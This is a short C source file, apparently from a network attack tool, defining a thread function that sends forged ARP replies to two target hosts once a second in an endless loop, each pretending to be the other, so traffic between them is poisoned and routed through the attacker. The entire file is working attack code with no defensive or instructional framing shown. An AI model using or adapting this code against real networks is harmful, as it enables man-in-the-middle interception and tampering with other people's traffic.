#include "../include/arp.h"

// Does arp-poisoning

    void *
arp_poison(void *arg_ptr) 
{
    struct data_pass *data_pass = (struct data_pass *)arg_ptr;

    while(1) 
    {
        //send a fake arp-reply to target 1 pretending to be target 2
        arp_reply(data_pass->ip2, data_pass->ip1, data_pass->mac1, data_pass->l);
        //send a fake arp-reply to target 2 pretending to be target 1
        arp_reply(data_pass->ip1, data_pass->ip2, data_pass->mac2, data_pass->l);
        sleep(1);
    }
}
